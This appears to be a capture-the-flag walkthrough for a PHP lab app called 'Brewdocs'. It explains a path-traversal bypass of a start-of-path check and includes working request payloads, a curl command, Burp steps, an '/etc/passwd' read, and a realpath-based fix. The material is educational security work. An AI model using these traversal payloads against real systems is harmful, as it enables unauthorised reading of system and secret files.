# Brewdocs — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability (level 6 — start-of-path validation)

`src/Article.php` confines reads to the `articles/` section like this:

```php
if (!str_starts_with($doc, 'articles/')) {         // start-of-path check
    throw new \RuntimeException('Rejected: not an articles/ document.');
}
return $kbDir . '/' . $doc;                          // join, un-normalised
```

The developer assumes that "if the request starts with `articles/`, it must be
one of our articles, so it is safe". The flaw is that the value is **never
normalised** before (or after) the check. A payload that *starts with*
`articles/` but then climbs out with `../` satisfies the prefix check and still
escapes:

```
doc = "articles/../../flag.txt"

str_starts_with("articles/../../flag.txt", "articles/")  -> true   (PASSES)
$kbDir . '/' . $doc  ==  /app/kb/articles/../../flag.txt
the filesystem resolves that to                             /app/flag.txt
```

The articles live in `/app/kb/articles/`, so climbing **two** levels
(`../../`) from there lands in `/app`, where `flag.txt` waits — one level above
the whole knowledge base.

## Exploitation

Normal, intended request:

```
GET /article.php?doc=articles/espresso-extraction.md
```

A plain `../` is rejected, because it does not start with `articles/` — which
is exactly what makes the check *feel* safe:

```
GET /article.php?doc=../flag.txt        -> 400 (no articles/ prefix)
GET /article.php?doc=flag.txt           -> 400 (no articles/ prefix)
```

The bypass — keep the required prefix, then climb out:

```
GET /article.php?doc=articles/../../flag.txt   -> the flag
```

With `curl`:

```bash
curl --path-as-is "http://localhost:8101/article.php?doc=articles/../../flag.txt"
```

Expected output (rendered inside the article page):

```
FLAG{BREWDOCS_SPILLED_THE_BEANS}
```

### Going further

Chain more `../` to climb past the app and read other files:

```
GET /article.php?doc=articles/../../../../etc/passwd
```

## Doing it in Burp Suite

1. Proxy your browser through Burp and open <http://localhost:8101>.
2. Open any article and capture the request in **Proxy > HTTP history** — note
   the `?doc=articles/<name>.md` parameter.
3. Send it to **Repeater**.
4. Try `doc=../flag.txt` — it is blocked (400). A filter is present and it does
   look at the start of the path.
5. Keep the required prefix and climb out:
   `doc=articles/../../flag.txt` — the guard is satisfied by the `articles/`
   prefix, the traversal escapes, and the flag is rendered.

## The fix

A start-of-path check on an un-normalised string is not containment. Canonicalise
the path and verify it really stays inside the base directory:

```php
$base = realpath($kbDir);
$full = realpath($kbDir . '/' . $doc);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

`realpath()` resolves the `../` segments *before* the comparison, so
`articles/../../flag.txt` canonicalises to `/app/flag.txt`, which does **not**
start with `/app/kb/` and is rejected.

Better still: never accept raw paths. Map an opaque article id to a known file
server-side (an allow-list), so user input never touches the filesystem path.
